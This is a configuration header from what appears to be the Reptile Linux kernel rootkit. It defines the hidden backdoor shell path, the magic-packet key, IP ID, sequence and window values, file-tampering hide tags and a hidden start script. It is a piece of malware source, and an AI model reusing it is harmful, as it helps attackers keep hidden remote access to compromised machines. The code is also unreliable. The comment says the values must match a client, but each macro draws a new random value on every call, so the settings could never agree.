/*
 * You can change the configurations in this file if you want.
 * But you need to make sure you'll change it in the client too.
 *
 * FIXME: randomly generate KEY, IPID, SEQ and WIN. 
 *
 * Note: I know it is not a good practice to have those configurations
 * constants, but since there is already known issues in Reptile, this 
 * will be the least of your problems. It will be updated next version!
 *
 */

#ifdef CONFIG_BACKDOOR
#   define SHELL_PATH "/"HIDE"/"HIDE"_shell"
#   define KEY generate_random_key()
#   define IPID generate_random_ipid()
#   define SEQ generate_random_seq()
#   define WIN generate_random_win()
#endif

#ifdef CONFIG_FILE_TAMPERING
#   define HIDETAGIN "#<"TAG_NAME">"
#   define HIDETAGOUT "#</"TAG_NAME">"
#endif

#define START_SCRIPT "/"HIDE"/"HIDE"_start"

// Dynamically generated configurations
#include <linux/random.h>

static inline unsigned int generate_random_key(void)
{
    unsigned int key;
    get_random_bytes(&key, sizeof(key));
    return key;
}

static inline unsigned short generate_random_ipid(void)
{
    unsigned short ipid;
    get_random_bytes(&ipid, sizeof(ipid));
    return ipid;
}

static inline unsigned int generate_random_seq(void)
{
    unsigned int seq;
    get_random_bytes(&seq, sizeof(seq));
    return seq;
}

static inline unsigned short generate_random_win(void)
{
    unsigned short win;
    get_random_bytes(&win, sizeof(win));
    return win;
}

#define DYNAMIC_KEY generate_random_key()
#define DYNAMIC_IPID generate_random_ipid()
#define DYNAMIC_SEQ generate_random_seq()
#define DYNAMIC_WIN generate_random_win()
